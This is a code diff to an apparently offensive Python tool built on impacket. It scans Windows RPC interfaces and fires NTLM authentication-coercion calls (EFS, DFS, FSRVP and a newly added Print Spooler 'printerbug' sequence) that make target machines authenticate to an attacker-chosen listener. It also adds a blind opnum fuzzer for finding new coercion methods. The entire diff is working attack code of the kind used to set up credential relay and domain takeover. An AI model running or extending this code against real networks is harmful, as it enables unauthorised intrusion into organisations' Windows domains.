@@ -85,9 +85,9 @@ except ImportError:
 
 try:
     from impacket import version, uuid as iuuid
-    from impacket.dcerpc.v5 import transport, epm
+    from impacket.dcerpc.v5 import transport, epm, rprn
     from impacket.dcerpc.v5.ndr import NDRCALL
-    from impacket.dcerpc.v5.dtypes import WSTR, ULONG, LPWSTR, DWORD
+    from impacket.dcerpc.v5.dtypes import WSTR, ULONG, LPWSTR, DWORD, NULL
     from impacket.dcerpc.v5.rpcrt import (
         RPC_C_AUTHN_WINNT,
         RPC_C_AUTHN_LEVEL_NONE,
@@ -248,14 +248,16 @@ class _EfsRpcEncryptFileSrv(NDRCALL):
     structure = (('FileName', WSTR),)
 
 
-def _fire_efs_openfileraw(dce, unc):
+# All fire(dce, unc, host) functions: `unc` is the \\listener\share\file path we
+# want the target to dial, `host` is the target (needed by the spooler's open).
+def _fire_efs_openfileraw(dce, unc, host):
     r = _EfsRpcOpenFileRaw()
     r['fileName'] = unc + '\x00'
     r['Flag'] = 0
     dce.request(r)
 
 
-def _fire_efs_encryptfilesrv(dce, unc):
+def _fire_efs_encryptfilesrv(dce, unc, host):
     r = _EfsRpcEncryptFileSrv()
     r['FileName'] = unc + '\x00'
     dce.request(r)
@@ -272,7 +274,7 @@ class _NetrDfsAddStdRoot(NDRCALL):
     )
 
 
-def _fire_dfs_addstdroot(dce, unc):
+def _fire_dfs_addstdroot(dce, unc, host):
     # unc is \\listener ; strip leading slashes for ServerName
     server = unc.lstrip('\\')
     r = _NetrDfsAddStdRoot()
@@ -289,10 +291,29 @@ class _IsPathSupported(NDRCALL):
     structure = (('ShareName', WSTR),)
 
 
-def _fire_fsrvp_ispathsupported(dce, unc):
+def _fire_fsrvp_ispathsupported(dce, unc, host):
     r = _IsPathSupported()
     r['ShareName'] = unc + '\\x\x00'
     dce.request(r)
+
+
+# ---- MS-RPRN : the spooler (printerbug). Two calls on the same binding:
+# open a handle to the target's own print server, then ask it to send change
+# notifications to \\listener, which makes it authenticate outbound to us. This
+# is why the spooler cannot be a one-shot blind fuzz target. ----
+def _fire_rprn(dce, unc, host):
+    # listener host is the first element of the \\listener\share\file path
+    listener = unc.lstrip('\\').split('\\')[0]
+    resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % host)
+    handle = resp['pHandle']
+    req = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
+    req['hPrinter'] = handle
+    req['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
+    req['fdwOptions'] = 0
+    req['pszLocalMachine'] = '\\\\%s\x00' % listener
+    req['dwPrinterLocal'] = 0
+    req['pOptions'] = NULL
+    dce.request(req)
 
 
 # interface_uuid (lowercase) -> coercion descriptor
@@ -331,17 +352,36 @@ COERCION_DB = {
             ('IsPathSupported', 'ShareName', _fire_fsrvp_ispathsupported),
         ],
     },
-    # MS-RPRN is coercible too but requires an RpcOpenPrinter handle sequence;
-    # left out of the auto-fire set to keep the active test single-call. It is
-    # still reported as a coercible interface in STAGE 2.
+    '12345678-1234-abcd-ef00-0123456789ab': {
+        'label': 'MS-RPRN (Print Spooler)',
+        'uuidtup': ('12345678-1234-abcd-ef00-0123456789ab', '1.0'),
+        'pipes': ['spoolss'],
+        'triggers': [
+            # two-call open-printer + notify sequence (handled inside the fire fn)
+            ('RpcRemoteFindFirstPrinterChangeNotificationEx', 'pszLocalMachine',
+             _fire_rprn),
+        ],
+    },
 }
 
 RPRN_UUID = '12345678-1234-abcd-ef00-0123456789ab'
 
 # Expected "it dialed us then failed to find the file" errors == coercion sent.
+# Used by the level-1 curated coerce path, where access-denied after a dial is a
+# known PetitPotam-style success signal.
 _EXPECTED_COERCE_ERRORS = (
     'ERROR_BAD_NETPATH', 'rpc_s_access_denied', 'ERROR_BAD_NET_NAME',
     'STATUS_BAD_NETWORK_NAME', 'ERROR_ACCESS_DENIED', 'STATUS_OBJECT_PATH_NOT_FOUND',
+)
+
+# Stricter set for the level-2 blind fuzz: ONLY path-resolution failures, which
+# are the closest thing to "the server treated the string as a remote path".
+# Access-denied is deliberately excluded here, because for an unknown method it
+# usually means the call was refused, not that anything was dialed, and treating
+# it as a hit floods the output with false LIKELYs.
+_FUZZ_REACHOUT_ERRORS = (
+    'ERROR_BAD_NETPATH', 'ERROR_BAD_NET_NAME', 'STATUS_BAD_NETWORK_NAME',
+    'STATUS_OBJECT_PATH_NOT_FOUND',
 )
 
 
@@ -1181,7 +1221,7 @@ class RPCAuthMap(object):
             return
         sent_ok = False
         try:
-            fire(dce, unc)
+            fire(dce, unc, host)
             sent_ok = True  # no exception: call accepted
         except Exception as e:
             es = str(e)
@@ -1290,17 +1330,23 @@ class RPCAuthMap(object):
         reached = False
         detail = ''
         try:
-            dce.request(inst)
-            detail = 'call accepted (no fault)'
+            # Send the request and read the raw reply WITHOUT asking impacket to
+            # map it onto a generated Response class (our class is dynamic and has
+            # none, which otherwise throws "no attribute FuzzCall_opNResponse").
+            dce.call(inst.opnum, inst)
+            dce.recv()
+            detail = 'call accepted, no error (likely not a path arg)'
         except Exception as e:
             es = str(e)
-            if any(code in es for code in _EXPECTED_COERCE_ERRORS):
+            if any(code in es for code in _FUZZ_REACHOUT_ERRORS):
                 reached = True
-                detail = 'post-dial path error (reached out)'
+                detail = 'path-not-found error returned (unconfirmed, no callback)'
             elif 'nca_s_op_rng_error' in es or 'opnum' in es.lower():
                 return 'rejected', 'bad opnum on this build'
             elif 'nca_s_fault' in es or 'NDR' in es or 'unmarshal' in es.lower():
                 return 'rejected', 'arg shape rejected (%s)' % es.split('\n')[0][:40]
+            elif 'access_denied' in es.lower() or 'STATUS_ACCESS_DENIED' in es:
+                return 'rejected', 'access denied (call refused, not a dial)'
             else:
                 detail = 'fault: %s' % es.split('\n')[0][:50]
         finally:
@@ -1369,7 +1415,7 @@ class RPCAuthMap(object):
 
         for u, bindings in sorted(iface_bindings.items()):
             name = KNOWN_INTERFACES.get(u, 'unknown interface')
-            coercible = (u in COERCION_DB) or (u == RPRN_UUID)
+            coercible = u in COERCION_DB
             ver = iface_versions.get(u, '1.0')
             sb_list = sorted(bindings)
             # Probe remote transports only, TCP first, pipe as fallback. An
@@ -1399,24 +1445,18 @@ class RPCAuthMap(object):
                                       'is_pipe': is_pipe})
 
             if coercible:
-                if u == RPRN_UUID:
-                    entry = {'uuid': u, 'label': 'MS-RPRN (Print Spooler)',
-                             'how': 'RpcRemoteFindFirstPrinterChangeNotificationEx '
-                                    'takes a UNC server argument',
-                             'auto': False, 'confirmed': None}
-                else:
-                    desc = COERCION_DB[u]
-                    methods = ', '.join(m[0] for m in desc['triggers'])
-                    entry = {'uuid': u, 'label': desc['label'],
-                             'how': '%s take a UNC/server argument' % methods,
-                             'auto': True, 'confirmed': None}
-                    if self.do_coerce and not self.fuzz_dry_run:
-                        hits = self.coerce_probe(host, desc)
-                        if any(h['confirmed'] for h in hits):
-                            entry['confirmed'] = True
-                            coerce_count += 1
-                        elif hits:
-                            entry['confirmed'] = False
+                desc = COERCION_DB[u]
+                methods = ', '.join(m[0] for m in desc['triggers'])
+                entry = {'uuid': u, 'label': desc['label'],
+                         'how': '%s take a UNC/server argument' % methods,
+                         'auto': True, 'confirmed': None}
+                if self.do_coerce and not self.fuzz_dry_run:
+                    hits = self.coerce_probe(host, desc)
+                    if any(h['confirmed'] for h in hits):
+                        entry['confirmed'] = True
+                        coerce_count += 1
+                    elif hits:
+                        entry['confirmed'] = False
                 coercibles.append(entry)
 
             if self.show_all:
@@ -1767,14 +1807,21 @@ def render_engagement_summary(results):
                        else c('candidate', C.YELLOW))
             left.append('%s  %s  %s' % (c(r['host'], C.BRED), verdict,
                                         c(labels, C.BBLUE)))
-        # level-2 fuzz findings (methods not in the curated catalog)
-        for f in r.get('fuzz_hits', []):
-            fv = (c('CONFIRMED', C.BOLD + C.GREEN) if f['verdict'] == 'CONFIRMED'
-                  else c('likely', C.YELLOW))
+        # level-2 fuzz findings: enumerate only the CONFIRMED ones (a real
+        # callback). LIKELY is unverified and can run to dozens of rows, so it is
+        # collapsed to a single count line instead of being reprinted in full.
+        fhits = r.get('fuzz_hits', [])
+        for f in [x for x in fhits if x['verdict'] == 'CONFIRMED']:
             flabel = '%s op%d (fuzz)' % (f.get('known') or f['uuid'][:8],
                                          f['opnum'])
-            left.append('%s  %s  %s' % (c(r['host'], C.BRED), fv,
+            left.append('%s  %s  %s' % (c(r['host'], C.BRED),
+                                        c('CONFIRMED', C.BOLD + C.GREEN),
                                         c(flabel, C.BBLUE)))
+        n_likely = sum(1 for x in fhits if x['verdict'] == 'LIKELY')
+        if n_likely:
+            left.append('%s  %s' % (c(r['host'], C.BRED),
+                                    c('+%d fuzz LIKELY (unverified; see the '
+                                      'per-host section)' % n_likely, C.YELLOW)))
 
         tags = []
         if r.get('ldap') and 'NOT required' in (r['ldap'] or ''):
